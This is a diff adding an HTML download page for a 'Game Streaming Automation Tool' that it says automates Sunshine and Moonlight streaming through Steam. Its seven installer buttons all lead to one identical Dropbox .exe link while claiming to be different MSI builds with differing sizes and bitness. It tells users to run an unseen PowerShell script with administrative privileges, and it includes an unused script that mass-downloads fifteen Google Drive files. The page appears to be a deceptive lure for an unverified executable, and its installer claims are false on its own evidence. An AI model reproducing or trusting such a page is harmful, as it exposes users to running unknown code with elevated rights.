@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Streaming Automation Tool</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background: url('https://drive.google.com/uc?export=download&id=10iiZClEYLz61VxS11fOT1spn7_Svchn2') no-repeat center center fixed; /* Full background image */
+            background-size: cover; /* Cover the entire screen */
+            color: #ffffff; /* Text color */
+        }
+        header {
+            background: rgba(0, 0, 128, 0.8); /* Dark blue with transparency */
+            color: #ffffff;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            overflow: hidden;
+            padding: 20px;
+            background: rgba(50, 50, 50, 0.8); /* Dark silver with transparency */
+            border-radius: 5px;
+            box-shadow: 0 0 10px #ccc;
+            animation: fadeIn 1s ease-in;
+            display: flex;
+            flex-direction: column; /* Stack items vertically */
+            align-items: center; /* Center align content */
+        }
+        .content {
+            width: 100%; /* Use full width */
+            margin-bottom: 20px; /* Space below content */
+        }
+        h1 {
+            margin: 0;
+        }
+        h2 {
+            color: #ffffff; /* White text for headings */
+            margin-bottom: 10px; /* Space below headings */
+        }
+        .features {
+            margin: 10px 0;
+            padding: 0;
+        }
+        .feature-item {
+            background: rgba(0, 0, 128, 0.7); /* Dark blue for feature items */
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+            transition: background 0.3s;
+        }
+        .feature-item:hover {
+            background: rgba(0, 0, 150, 0.9); /* Slightly lighter blue on hover */
+        }
+        footer {
+            text-align: center;
+            padding: 10px 0;
+            background: rgba(0, 0, 128, 0.8); /* Dark blue footer */
+            color: #ffffff;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+        }
+        .download-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background: #35424a; /* Dark silver for buttons */
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            margin: 10px 0;
+            transition: background 0.3s;
+        }
+        .download-btn:hover {
+            background: #45a049; /* Green on hover */
+        }
+        .instructions {
+            background: rgba(50, 50, 50, 0.8); /* Dark silver for instructions */
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            margin-bottom: 20px; /* Space below instructions */
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .note {
+            font-size: 0.9em;
+            color: #ffffff; /* White text for notes */
+        }
+        .video-container {
+            width: 100%; /* Full width for the video container */
+            height: auto; /* Height will adjust automatically */
+            text-align: center; /* Center align video */
+            margin-top: 20px; /* Space above video */
+        }
+        iframe {
+            width: 100%; /* Make iframe full width */
+            max-width: 480px; /* Set a max width for the video */
+            height: 270px; /* Set height for the video */
+            border: none; /* Remove border */
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Game Streaming Automation Tool</h1>
+    <p>Your all-in-one solution for seamless game streaming</p>
+</header>
+
+<div class="container">
+    <div class="content">
+        <h2>About the App</h2>
+        <p>This tool automates the process of setting up game streaming with Sunshine and Moonlight, allowing you to easily configure your games, update settings, and launch them directly through Steam.</p>
+
+        <h2>Features</h2>
+        <div class="features">
+            <div class="feature-item">
+                <strong>Automatic AppID fetching from Steam</strong>
+                <p>This feature automatically retrieves the AppID for your games from Steam, simplifying the setup process and ensuring you have the correct identifiers for streaming.</p>
+            </div>
+            <div class="feature-item">
+                <strong>Easy Sunshine configuration updates</strong>
+                <p>Effortlessly update your Sunshine configuration settings with this tool, allowing for streamlined adjustments and improved game streaming performance.</p>
+            </div>
+            <div class="feature-item">
+                <strong>Integrated game launching through Steam</strong>
+                <p>Launch your games directly through Steam with integrated functionality, making it easy to start your favorite titles with a click.</p>
+            </div>
+            <div class="feature-item">
+                <strong>User-friendly interface with animation</strong>
+                <p>The tool features an intuitive, animated interface that enhances user experience and makes navigating the application enjoyable.</p>
+            </div>
+            <div class="feature-item">
+                <strong>Comprehensive error handling</strong>
+                <p>This feature provides robust error handling capabilities, ensuring that issues are logged and can be addressed quickly, minimizing disruptions to your streaming experience.</p>
+            </div>
+        </div>
+
+        <h2>Watch the Tutorial</h2>
+        <div class="video-container">
+            <iframe allow="fullscreen;autoplay" allowfullscreen height="270" src="https://streamable.com/e/4rkgvg?autoplay=1" width="480" style="border:none;"></iframe>
+            <p>Watch the video for guidance!</p>
+        </div>
+    </div>
+
+    <div class="instructions">
+        <h2>Instructions</h2>
+        <p>Follow these steps to install and use the Game Streaming Automation Tool:</p>
+        <ol>
+            <li>Download the Game Streaming Automation Tool using the buttons below.</li>
+            <li>Run the installer by double-clicking the downloaded file.</li>
+            <li>Follow the on-screen prompts to complete the installation.</li>
+            <li>Run the PowerShell script with administrative privileges.</li>
+            <li>Follow the on-screen prompts to add your games.</li>
+            <li>Enjoy seamless streaming with Sunshine and Moonlight!</li>
+        </ol>
+    </div>
+
+    <h2>Download Links</h2>
+    <ul class="download-list">
+        <li>
+            <a class="download-btn" href="https://www.dropbox.com/scl/fi/nqn91106ky5ux6oyshq7e/Game-Streaming-Automation-Tool.exe?rlkey=5dnwic4texp46mgp0a0fbrcxx&st=q30843d2&dl=1" download>Installer 1 (64-bit) - MSI Installer</a>
+            <span class="note">Size: 150 MB</span>
+        </li>
+        <li>
+            <a class="download-btn" href="https://www.dropbox.com/scl/fi/nqn91106ky5ux6oyshq7e/Game-Streaming-Automation-Tool.exe?rlkey=5dnwic4texp46mgp0a0fbrcxx&st=q30843d2&dl=1" download>Installer 2 (32-bit) - MSI Installer</a>
+            <span class="note">Size: 120 MB</span>
+        </li>
+        <li>
+            <a class="download-btn" href="https://www.dropbox.com/scl/fi/nqn91106ky5ux6oyshq7e/Game-Streaming-Automation-Tool.exe?rlkey=5dnwic4texp46mgp0a0fbrcxx&st=q30843d2&dl=1" download>Installer 3 (64-bit) - MSI Installer</a>
+            <span class="note">Size: 180 MB</span>
+        </li>
+        <li>
+            <a class="download-btn" href="https://www.dropbox.com/scl/fi/nqn91106ky5ux6oyshq7e/Game-Streaming-Automation-Tool.exe?rlkey=5dnwic4texp46mgp0a0fbrcxx&st=q30843d2&dl=1" download>Installer 4 (64-bit) - MSI Installer</a>
+            <span class="note">Size: 200 MB</span>
+        </li>
+        <li>
+            <a class="download-btn" href="https://www.dropbox.com/scl/fi/nqn91106ky5ux6oyshq7e/Game-Streaming-Automation-Tool.exe?rlkey=5dnwic4texp46mgp0a0fbrcxx&st=q30843d2&dl=1" download>Installer 5 (32-bit) - MSI Installer</a>
+            <span class="note">Size: 110 MB</span>
+        </li>
+        <li>
+            <a class="download-btn" href="https://www.dropbox.com/scl/fi/nqn91106ky5ux6oyshq7e/Game-Streaming-Automation-Tool.exe?rlkey=5dnwic4texp46mgp0a0fbrcxx&st=q30843d2&dl=1" download>Installer 6 (64-bit) - MSI Installer</a>
+            <span class="note">Size: 190 MB</span>
+        </li>
+        <li>
+            <a class="download-btn" href="https://www.dropbox.com/scl/fi/nqn91106ky5ux6oyshq7e/Game-Streaming-Automation-Tool.exe?rlkey=5dnwic4texp46mgp0a0fbrcxx&st=q30843d2&dl=1" download>Installer 7 (32-bit) - MSI Installer</a>
+            <span class="note">Size: 95 MB</span>
+        </li>
+    </ul>
+</div>
+
+<footer>
+    <p>&copy; 2023 Game Streaming Automation Tool. All rights reserved.</p>
+</footer>
+
+<script>
+    function downloadAllVideos() {
+        const videoFiles = [
+            'https://drive.google.com/uc?export=download&id=109xQUyhqvc8gMrOfwwY-4Pmz_1S7Tltj',
+            'https://drive.google.com/uc?export=download&id=105OOAS-5oO0WAQSoxm_ZCmmncNYxYB7e',
+            'https://drive.google.com/uc?export=download&id=103uTJASXXIi2RM5c4pcqeFhiv26y_tgf',
+            'https://drive.google.com/uc?export=download&id=1-ysw_kBKounDn8erRg34xjOgItDrcMBV',
+            'https://drive.google.com/uc?export=download&id=1-ujoPY7vQvNRGROaJBiUVBnEL4ncv5gj',
+            'https://drive.google.com/uc?export=download&id=1-qIMnoisA5xUdEbyKL0DhOqYHVHVoNdg',
+            'https://drive.google.com/uc?export=download&id=1-qCU81TKsxbOQp18F_D1XBWQux8qX_a3',
+            'https://drive.google.com/uc?export=download&id=1-kMLZo1TNrqc5aCGDV4lkeHUXVUhFl5a',
+            'https://drive.google.com/uc?export=download&id=10SktLHZXd1EOXJBDACMVtU0u6gMtgtXN',
+            'https://drive.google.com/uc?export=download&id=10SNGY9I1-Eme5yD_EfZDJxbfnB2ZvUHc',
+            'https://drive.google.com/uc?export=download&id=10KWX0H_CDGdDUAqpnRUOH9D2WpZsVM2r',
+            'https://drive.google.com/uc?export=download&id=10J3GnHFk16-pfOetk5GD3ULagu8I5XTJ',
+            'https://drive.google.com/uc?export=download&id=10IhmvbDbmI2ew0c_jvHvrfhC1xePW90c',
+            'https://drive.google.com/uc?export=download&id=10IFNNpxnrbWeyNP2NsYPbOLuK3g98n9X',
+            'https://drive.google.com/uc?export=download&id=10GPDVop7Nw7F5l3rdyD_aJd279CHn3II'
+        ];
+
+        videoFiles.forEach(url => {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = ''; // This will prompt download
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
+    }
+</script>
+
+</body>
+</html>
